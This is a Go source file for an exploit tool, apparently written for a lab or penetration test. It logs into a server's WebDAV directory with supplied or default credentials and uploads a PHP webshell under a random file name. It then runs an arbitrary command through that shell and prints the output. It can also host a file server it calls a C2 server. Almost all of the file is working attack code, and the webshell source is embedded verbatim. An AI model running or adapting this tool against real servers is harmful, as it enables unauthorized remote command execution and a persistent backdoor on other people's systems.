package main

import (
	"bytes"
	"encoding/base64"
	"errors"
	"flag"
	"fmt"
	"io"
	"io/ioutil"
	"math/rand"
	"mime/multipart"
	"net"
	"net/http"
	"net/textproto"
	"net/url"
	"os"
	"regexp"
	"strings"
	"sync"
	"time"
)

var ANSI_CLRLN string = "\r\x1b[2K\r"
var ANSI_CLRSC string = "\x1b[2J\x1b[H"
var ANSI_RST string = "\x1b[0m"
var ANSI_RED string = "\x1b[31;1m"
var ANSI_GRN string = "\x1b[32;1m"
var ANSI_YLW string = "\x1b[33;1m"
var ANSI_BLU string = "\x1b[34;1m"

type Client struct {
	baseURL    string
	Route      string
	Session    *http.Client
	Login      Creds
	Targetfile string
}

type Creds struct {
	Username string
	Password string
}

var SRV http.Server

//
// Function Name: createUploadBody
//
// Author: Thomas Osgood
//
// Description:
//
//  Function designed to creat the multipart mime
//  body that will be used in the PUT request to
//  upload the webshell to the target.
//
// Input(s):
//
//  reqbody - **bytes.Buffer. body that will be sent in request.
//
// Return(s):
//
//  err - error. error or nil.
//
func (c *Client) createUploadBody(reqbody **bytes.Buffer) (err error) {
	var fileheader string
	var mimeheader textproto.MIMEHeader = make(textproto.MIMEHeader)
	var mimepart io.Writer
	var mimewriter *multipart.Writer
	var shellcontent string = "<?php\nif (isset($_GET['c'])) {\n\tsystem(\"nohup \".$_GET['c']);\n} elseif (isset($_POST['c'])) {\n\tsystem(\"nohup \".$_POST['c']);\n}\n?>"

	fileheader = fmt.Sprintf("form-data; name=\"%s\"; filename=\"%s\"", c.Targetfile, c.Targetfile)

	mimewriter = multipart.NewWriter(*reqbody)
	defer mimewriter.Close()

	mimeheader.Set("Content-Type", "multipart/form-data")
	mimeheader.Set("Content-Disposition", fileheader)

	mimepart, err = mimewriter.CreatePart(mimeheader)
	if err != nil {
		return err
	}
	mimepart.Write([]byte(shellcontent))
	return nil
}

//
// Function Name: ExecCommand
//
// Author: Thomas Osgood
//
// Description:
//
//  Function designed to execute a command on the
//  target using the uploaded webshell.
//
// Input(s):
//
//  command - string. command to execute.
//
// Return(s):
//
//  output - string. command output.
//  err - error. error or nil.
//
func (c *Client) ExecCommand(command string) (output string, err error) {
	var bodycontent []byte
	var params url.Values = url.Values{}
	var patternmatch string
	var req *http.Request
	var resp *http.Response
	var targetpatterns []string = []string{"--.*", "--.*--", "Content-Disposition:.*", "Content-Type:.*"}
	var targetroute string = fmt.Sprintf("webdav/%s", c.Targetfile)
	var targeturl string = fmt.Sprintf("%s/%s", c.baseURL, targetroute)

	params.Set("c", command)

	req, err = http.NewRequest(http.MethodGet, targeturl, nil)
	if err != nil {
		return "", err
	}
	req.URL.RawQuery = params.Encode()

	err = c.setAuthHeader(&req)
	if err != nil {
		return "", err
	}

	resp, err = c.Session.Do(req)
	if err != nil {
		if os.IsTimeout(err) {
			return "", nil
		}
		return "", err
	}
	defer resp.Body.Close()

	if resp.StatusCode >= 400 {
		return "", errors.New(fmt.Sprintf("error executing command (%s)", resp.Status))
	}

	bodycontent, err = ioutil.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}

	output = string(bodycontent)
	for _, pattern := range targetpatterns {
		patternmatch, err = FindMatch([]byte(output), pattern)
		if err != nil {
			ErrMsg(err.Error())
			continue
		}
		output = strings.ReplaceAll(output, patternmatch, "")
	}
	output = strings.Trim(output, "\r\n")

	return output, nil
}

//
// Function Name: SetAuthHeader
//
// Author: Thomas Osgood
//
// Description:
//
//  Function designed to set the authorization header.
//  This header uses Basic authorization, which is
//  a base64 encoded string containing the username
//  and password.
//
// Input(s):
//
//  req - **http.Request. request to set header for.
//
// Return(s):
//
//  err - error. error or nil.
//
func (c *Client) setAuthHeader(req **http.Request) (err error) {
	var authformat string = fmt.Sprintf("%s:%s", c.Login.Username, c.Login.Password)
	var authformat64 string = base64.RawStdEncoding.EncodeToString([]byte(authformat))
	var authheader string = fmt.Sprintf("Basic %s", authformat64)

	if len(c.Login.Username) < 1 {
		return errors.New("username must be a non-zero length string")
	} else if len(c.Login.Password) < 1 {
		return errors.New("password must be a non-zero length string")
	}

	(*req).Header.Set("Authorization", authheader)

	return nil
}

// ============================================================
//
// Function Name: Testconnection
//
// Author: Thomas Osgood
//
// Description:
//
//  Function designed to test the connection to a target.
//
// Input(s):
//
//  None.
//
// Return(s):
//
//  success - bool. indication of success.
//  message - string. status message.
//
// ============================================================
func (c *Client) TestConnection() (err error) {
	SysMsgNB(fmt.Sprintf("testing connection to \"%s\"", c.baseURL))

	resp, err := c.Session.Get(c.baseURL)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	return nil
}

//
// Function Name: TestCredentials
//
// Author: Thomas Osgood
//
// Description:
//
//  Function designed to test given credentials. This
//  attempts to access the /webdav section of the
//  target, which requires authorization.
//
// Input(s):
//
//  None
//
// Return(s):
//
//  err - error. error or nil.
//
func (c *Client) TestCredentials() (err error) {
	var req *http.Request
	var resp *http.Response
	var targeturl string = fmt.Sprintf("%s/webdav", c.baseURL)

	req, err = http.NewRequest(http.MethodGet, targeturl, nil)
	if err != nil {
		return err
	}

	SysMsgNB("setting authorization header ...")
	err = c.setAuthHeader(&req)
	if err != nil {
		return err
	}
	SucMsg("authorization header successfully set")

	SysMsgNB("attempting to access restricted section ...")
	resp, err = c.Session.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		return errors.New(fmt.Sprintf("[auth] bad status code (%s)", resp.Status))
	}

	return nil
}

//
// Function Name: UploadShell
//
// Author: Thomas Osgood
//
// Description:
//
//  Function designed to upload a webshell to the
//  target. This webshell will be used to execute
//  commands on the target server.
//
// Input(s):
//
//  None
//
// Return(s):
//
//  err - error. error or nil.
//
func (c *Client) UploadShell() (err error) {
	var reqbody *bytes.Buffer = &bytes.Buffer{}
	var req *http.Request
	var resp *http.Response
	var targeturl string

	c.Targetfile, err = GenRandomName(5, 15)
	if err != nil {
		return err
	}
	c.Targetfile = fmt.Sprintf("%s.php", c.Targetfile)

	targeturl = fmt.Sprintf("%s/webdav/%s", c.baseURL, c.Targetfile)

	SysMsgNB("building multipart data ...")
	err = c.createUploadBody(&reqbody)
	if err != nil {
		return err
	}

	SysMsgNB("building request ...")
	req, err = http.NewRequest(http.MethodPut, targeturl, reqbody)
	if err != nil {
		return err
	}

	err = c.setAuthHeader(&req)
	if err != nil {
		return err
	}

	SysMsgNB(fmt.Sprintf("uploading \"%s\" to target ...", c.Targetfile))
	resp, err = c.Session.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode >= 400 {
		return errors.New(fmt.Sprintf("file upload failed (%s)", resp.Status))
	}

	return nil
}

func SucMsg(msg string) {
	fmt.Printf("%s[%s+%s] %s\n", ANSI_CLRLN, ANSI_GRN, ANSI_RST, msg)
	return
}

func ErrMsg(msg string) {
	fmt.Printf("%s[%s-%s] %s\n", ANSI_CLRLN, ANSI_RED, ANSI_RST, msg)
	return
}

func InfMsg(msg string) {
	fmt.Printf("%s[%si%s] %s\n", ANSI_CLRLN, ANSI_BLU, ANSI_RST, msg)
	return
}

func InfMsgNB(msg string) {
	fmt.Printf("%s[%si%s] %s", ANSI_CLRLN, ANSI_BLU, ANSI_RST, msg)
	return
}

func SysMsg(msg string) {
	fmt.Printf("%s[%s*%s] %s\n", ANSI_CLRLN, ANSI_YLW, ANSI_RST, msg)
	return
}

func SysMsgNB(msg string) {
	fmt.Printf("%s[%s*%s] %s", ANSI_CLRLN, ANSI_YLW, ANSI_RST, msg)
	return
}

func ValidatePort(portno int) (success bool, message string) {
	if (portno < 1) || (portno > 65535) {
		return false, "port must be between 1 and 65535"
	}
	return true, "port valid"
}

//============================================================
//
// Function Name: PrintCenter
//
// Author: Thomas Osgood
//
// Description:
//
//  Function designed to print a message in the center of a
//  specified number of columns (n).
//
// Input(s):
//
//  msg - string. message to display.
//  n - int. total number of columns in row.
//
// Return(s):
//
//  None
//
//============================================================
func PrintCenter(msg string, n int) {
	var ansi_indent string = "\x1b%s"
	var indent_format string = "[%dC"
	var indent int

	fmt.Printf("%s", ANSI_CLRLN)
	if len(msg) > n {
		fmt.Printf("%s\n", msg)
		return
	}

	indent = (n - len(msg)) / 2
	indent_format = fmt.Sprintf(indent_format, indent)
	ansi_indent = fmt.Sprintf(ansi_indent, indent_format)

	fmt.Printf("%s%s%s%s\n", ansi_indent, ANSI_YLW, msg, ANSI_RST)

	return
}

func PrintChar(char byte, n int) {
	if n < 1 {
		return
	}

	for i := 0; i < n; i++ {
		fmt.Printf("%s%s%s", ANSI_RED, string(char), ANSI_RST)
	}
	fmt.Printf("\n")
}

//============================================================
//
// Function Name: FindMatch
//
// Author: Thomas Osgood
//
// Description:
//
//  Function designed to take a byte slice, search the slice
//  for a given regular expression pattern, and return the
//  first match of that pattern.
//
// Input(s):
//
//  bodycontent - []byte. byte slice to search for pattern.
//  tgtpattern - string. regex pattern to search for.
//
// Return(s):
//
//  match - string. first match of pattern discovered.
//  success - bool. indication of success.
//  message - string. status message.
//
//============================================================
func FindMatch(bodycontent []byte, tgtpattern string) (match string, err error) {

	re, err := regexp.Compile(tgtpattern)
	if err != nil {
		return "", err
	}

	matches := re.FindAll(bodycontent, -1)

	if len(matches) < 1 {
		return "", err
	}

	match = string(matches[0])

	return match, nil
}

// ============================================================
//
// Function Name: GenRandomName
//
// Author: Thomas Osgood
//
// Description:
//
//  Function designed to generate a random string 8 characters
//  long, containing only alpha-numeric characters.
//
// Input(s):
//
//  None.
//
// Return(s):
//
//  success - bool. indication of success.
//  message - string. status message.
//
// ============================================================
func GenRandomName(min int, max int) (name string, err error) {
	const charset string = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	var length int

	rand.Seed(time.Now().UnixMilli())

	if max < min {
		return "", errors.New("max must be greater than or equal to min")
	}

	// choose length in range min --> max
	length = min + rand.Intn(max-min)

	name = ""

	for i := 0; i < length; i++ {
		name = fmt.Sprintf("%s%s", name, string(charset[rand.Intn(len(charset))]))
	}

	return name, nil
}

//
// Function Name: GrabIPs
//
// Author: Thomas Osgood
//
// Description:
//
//    Function designed to acquire all IPv4 network addresses
//    attached to the current machine. If the targetIface
//    argument is set to "", all network interfaces will be
//    searched. If a specific network interface is speficied,
//    only that interface's IP address(es) will be returned.
//    If the specified network interface does not exist, an
//    error will be returned.
//
// Input(s):
//
//    targetIface - string. interface to get IP for.
//
// Return(s):
//
//    ipList - []net.IP. list of IP addresses acquired.
//    err - error. error or nil.
//
func GrabIPs(targetIface string) (ipList []net.IP, err error) {
	var address net.Addr
	var addresses []net.Addr
	var foundiface bool = false
	var iface net.Interface
	var interfaces []net.Interface
	var ip net.IP

	//------------------------------------------------------------
	// grab all network interfaces
	//------------------------------------------------------------
	interfaces, err = net.Interfaces()
	if err != nil {
		return nil, err
	}

	for _, iface = range interfaces {

		//------------------------------------------------------------
		// ignore loopback addresses (127.0.0.1)
		//------------------------------------------------------------
		if strings.Contains(iface.Flags.String(), net.FlagLoopback.String()) {
			continue
		}

		//------------------------------------------------------------
		// if target interface is set, only display target
		//------------------------------------------------------------
		if (len(targetIface) > 0) && (iface.Name != targetIface) {
			continue
		}

		foundiface = true

		//------------------------------------------------------------
		// grab all addresses from current interface
		//------------------------------------------------------------
		addresses, err = iface.Addrs()
		if err != nil {
			return nil, err
		}

		//------------------------------------------------------------
		// loop through all addresses present in current interface
		//------------------------------------------------------------
		for _, address = range addresses {
			switch v := address.(type) {
			case *net.IPNet:
				ip = v.IP
			case *net.IPAddr:
				ip = v.IP
			}

			//------------------------------------------------------------
			// only grab IPv4 addresses
			//------------------------------------------------------------
			if ip.To4() == nil {
				continue
			}

			ipList = append(ipList, ip)
		}
	}

	//------------------------------------------------------------
	// error finding target (or any) network interface
	//------------------------------------------------------------
	if (len(targetIface) > 0) && !foundiface {
		return nil, errors.New(fmt.Sprintf("unable to find interface \"%s\"", targetIface))
	} else if !foundiface {
		return nil, errors.New("no network interfaces discovered")
	}

	return ipList, nil
}

//
// Function Name: StartListener
//
// Author: Thomas Osgood
//
// Description:
//
//    Function designed to create an HTTP server to use during
//    this attack. It can deliver files to the target and decode
//    data coming from the target.
//
// Input(s):
//
//    ip - string. ip address to listen on.
//    port - int. port to listen on.
//    wg - *sync.WaitGroup. waitgroup this is a part of.
//
// Return(s):
//
//    err - error. error or nil.
//
func StartListener(ip string, port int, wg *sync.WaitGroup) (err error) {
	if wg != nil {
		defer wg.Done()
	}

	SRV = http.Server{Addr: fmt.Sprintf("%s:%d", ip, port)}

	var currentDir string
	var fs http.Handler

	currentDir, err = os.Getwd()

	fs = http.FileServer(http.Dir(currentDir))

	http.Handle("/", http.StripPrefix("/", fs))

	SucMsg(fmt.Sprintf("fileserver being hosted at %s:%d", ip, port))
	if err = SRV.ListenAndServe(); err != http.ErrServerClosed {
		ErrMsg(err.Error())
		return err
	}
	SucMsg("server successfully shutdown")

	return nil
}

func init() {
	return
}

func main() {
	var domain string
	var port int

	var baseURL string
	var scheme string

	var secure bool
	var iface bool

	var ips []net.IP
	var err error

	var c2ip string
	var c2p int

	var proxyaddr string

	var transport http.Transport = http.Transport{}
	var client Client = Client{Session: &http.Client{Timeout: 10 * time.Second, Transport: &transport}}
	var command string
	var output string

	flag.StringVar(&domain, "d", "127.0.0.1", "domain or ip address of target")
	flag.IntVar(&port, "p", 80, "port to communicate with target on")
	flag.BoolVar(&secure, "s", false, "use HTTPS instead of HTTP")
	flag.BoolVar(&secure, "secure", false, "use HTTPS instead of HTTP")
	flag.StringVar(&c2ip, "c2ip", "", "ip, domain, or interface of C2 server")
	flag.IntVar(&c2p, "c2port", 9999, "port to contact c2 server on")
	flag.StringVar(&proxyaddr, "proxy", "", "proxy to use when making requests (http://...)")
	flag.BoolVar(&iface, "interface", false, "c2ip specified is network interface")
	flag.StringVar(&client.Login.Username, "U", "admin", "username to authenticate with")
	flag.StringVar(&client.Login.Password, "P", "admin", "password to authenticate with")
	flag.StringVar(&command, "c", "whoami", "command to execute on target")
	flag.Parse()

	success, message := ValidatePort(port)
	if !success {
		ErrMsg(message)
		os.Exit(1)
	}

	if len(c2ip) > 0 {
		//============================================================
		// if "c2" specified is a network interface, take the
		// IP address of the interface and assign it to the
		// c2 variable to be used
		//============================================================
		if iface {
			ips, err = GrabIPs(c2ip)
			if err != nil {
				ErrMsg(err.Error())
				os.Exit(1)
			}
			c2ip = ips[0].String()
		}

		success, message = ValidatePort(c2p)
		if !success {
			ErrMsg(message)
			os.Exit(1)
		}

	}

	if len(proxyaddr) > 0 {
		var proxyurl *url.URL = &url.URL{}
		var proxysplit []string = strings.Split(proxyaddr, "://")
		var hostsplit []string
		var hostroute string

		if len(proxysplit) < 2 {
			ErrMsg("proxy must be in form \"http://<address>\" or \"https://<address>\"")
			os.Exit(1)
		}

		proxyurl.Scheme = proxysplit[0]

		hostsplit = strings.Split(proxysplit[1], "/")
		proxyurl.Host = hostsplit[0]

		if len(hostsplit) > 1 {
			hostroute = strings.Join(hostsplit[1:], "/")
			proxyurl.Path = hostroute
		}

		transport.Proxy = http.ProxyURL(proxyurl)
	}

	PrintChar('=', 60)
	PrintCenter("Target Information", 60)
	PrintChar('=', 60)
	InfMsg(fmt.Sprintf("Target Domain: %s", domain))
	InfMsg(fmt.Sprintf("Target Port: %d", port))
	InfMsg(fmt.Sprintf("HTTPS: %v", secure))

	if len(c2ip) > 0 {
		InfMsg(fmt.Sprintf("C2IP: %s", c2ip))
		InfMsg(fmt.Sprintf("C2Port: %d", c2p))
	}

	if len(proxyaddr) > 0 {
		InfMsg(fmt.Sprintf("Proxy: %s", proxyaddr))
	}

	PrintChar('=', 60)

	//============================================================
	// HTTPS check.
	//============================================================
	if secure {
		scheme = "https"
	} else {
		scheme = "http"
	}
	baseURL = fmt.Sprintf("%s://%s:%d", scheme, domain, port)

	client.baseURL = baseURL

	if len(c2ip) > 0 {
		go StartListener(c2ip, c2p, nil)
		defer SRV.Close()
		time.Sleep(time.Millisecond * 250)
	}

	//============================================================
	// Make sure the target is reachable.
	//============================================================
	err = client.TestConnection()
	if err != nil {
		ErrMsg(err.Error())
		os.Exit(1)
	}
	SucMsg("connection to target successful")

	err = client.TestCredentials()
	if err != nil {
		ErrMsg(err.Error())
		os.Exit(1)
	}
	SucMsg("credentials confirmed")

	err = client.UploadShell()
	if err != nil {
		ErrMsg(err.Error())
		os.Exit(1)
	}
	SucMsg(fmt.Sprintf("\"%s\" successfully uploaded to target", client.Targetfile))

	output, err = client.ExecCommand(command)
	if err != nil {
		ErrMsg(err.Error())
		os.Exit(1)
	}

	if len(output) < 1 {
		SucMsg("no output returned. possible long running command or shell")
	} else {
		SucMsg("command successfully executed")
		PrintChar('=', 60)
		PrintCenter("Output", 60)
		PrintChar('=', 60)
		fmt.Printf("%s\n", output)
		PrintChar('=', 60)
	}

	return
}

